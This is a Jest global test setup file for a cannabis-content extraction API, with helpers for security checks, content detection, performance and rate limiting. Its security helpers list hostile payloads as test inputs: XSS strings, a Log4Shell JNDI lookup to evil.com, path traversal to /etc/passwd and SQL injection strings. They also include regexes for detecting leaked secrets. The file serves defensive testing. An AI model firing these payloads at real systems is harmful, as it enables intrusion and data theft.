// Global test setup for Cannabis Extractor API
// This file runs before all tests

const { performance } = require('perf_hooks');

// Global test configuration
global.testStartTime = performance.now();

// Set test environment variables
process.env.NODE_ENV = 'test';
process.env.PORT = '0'; // Use random port
process.env.SECURITY_TESTING = 'true';

// Increase timeout for security tests
jest.setTimeout(30000);

// Global test utilities
global.testUtils = {
  // Security test helpers
  security: {
    maliciousPayloads: [
      'javascript:alert(1)',
      '<script>alert("xss")</script>',
      '${jndi:ldap://evil.com/a}',
      '../../etc/passwd',
      'file:///etc/passwd',
      'data:text/html,<script>alert(1)</script>',
      '${7*7}', // Template injection
      '{{7*7}}', // Handlebars injection
      'SELECT * FROM users;', // SQL injection
      '"; DROP TABLE users; --',
      '<img src=x onerror=alert(1)>',
      'javascript:void(0)'
    ],

    validUrls: [
      'https://example.com',
      'https://www.google.com',
      'https://httpbin.org/get',
      'https://jsonplaceholder.typicode.com/posts/1'
    ],

    cannabisUrls: [
      'https://leafly.com',
      'https://weedmaps.com',
      'https://dispensary-example.com'
    ],

    validateSecurityHeaders: (headers) => {
      const requiredHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'x-xss-protection'
      ];

      const missing = requiredHeaders.filter(header => !headers[header]);
      return {
        valid: missing.length === 0,
        missing
      };
    },

    checkForSensitiveData: (data) => {
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /token/i,
        /api.?key/i,
        /private.?key/i,
        /database.?url/i,
        /connection.?string/i,
        /process\.env/i
      ];

      const dataString = JSON.stringify(data);
      return sensitivePatterns.some(pattern => pattern.test(dataString));
    }
  },

  // Cannabis-specific test helpers
  cannabis: {
    detectCannabisContent: (content) => {
      const cannabisKeywords = [
        'marijuana', 'cannabis', 'weed', 'hemp', 'thc', 'cbd',
        'dispensary', 'strain', 'indica', 'sativa', 'edibles'
      ];

      const contentString = content.toLowerCase();
      return cannabisKeywords.some(keyword => contentString.includes(keyword));
    },

    validateExtractionResponse: (response) => {
      const required = ['success', 'url', 'timestamp'];
      const cannabisSpecific = ['browserEmulation', 'products', 'count'];

      const hasRequired = required.every(field => response.hasOwnProperty(field));
      const hasCannabisFields = cannabisSpecific.some(field => response.hasOwnProperty(field));

      return { hasRequired, hasCannabisFields };
    }
  },

  // Performance test helpers
  performance: {
    measureResponseTime: async (requestFn) => {
      const start = performance.now();
      const result = await requestFn();
      const end = performance.now();

      return {
        result,
        responseTime: end - start
      };
    },

    expectResponseTime: (responseTime, maxTime = 5000) => {
      expect(responseTime).toBeLessThan(maxTime);
    }
  },

  // Rate limiting test helpers
  rateLimiting: {
    makeRapidRequests: async (requestFn, count = 10) => {
      const requests = Array(count).fill().map(() => requestFn());
      return Promise.allSettled(requests);
    },

    checkRateLimitHeaders: (headers) => {
      return {
        hasLimit: headers['x-ratelimit-limit'] !== undefined,
        hasRemaining: headers['x-ratelimit-remaining'] !== undefined,
        hasReset: headers['x-ratelimit-reset'] !== undefined
      };
    }
  }
};

// Console override for test environment
const originalConsole = global.console;
global.console = {
  ...originalConsole,
  // Suppress logs during tests unless specifically needed
  log: process.env.VERBOSE_TESTS ? originalConsole.log : () => {},
  info: process.env.VERBOSE_TESTS ? originalConsole.info : () => {},
  warn: originalConsole.warn,
  error: originalConsole.error
};

// Global error handlers for tests
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Don't exit the process during tests
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  // Don't exit the process during tests
});

// Clean up after all tests
afterAll(async () => {
  const testEndTime = performance.now();
  const totalTestTime = testEndTime - global.testStartTime;

  if (process.env.VERBOSE_TESTS) {
    console.log(`\n🧪 Total test execution time: ${Math.round(totalTestTime)}ms`);
  }

  // Give time for async operations to complete
  await new Promise(resolve => setTimeout(resolve, 1000));
});

// Test database/state cleanup
beforeEach(() => {
  // Reset any global state before each test
  if (global.testServer) {
    // Ensure clean state between tests
  }
});

afterEach(() => {
  // Clean up after each test
  jest.clearAllMocks();
});

module.exports = global.testUtils;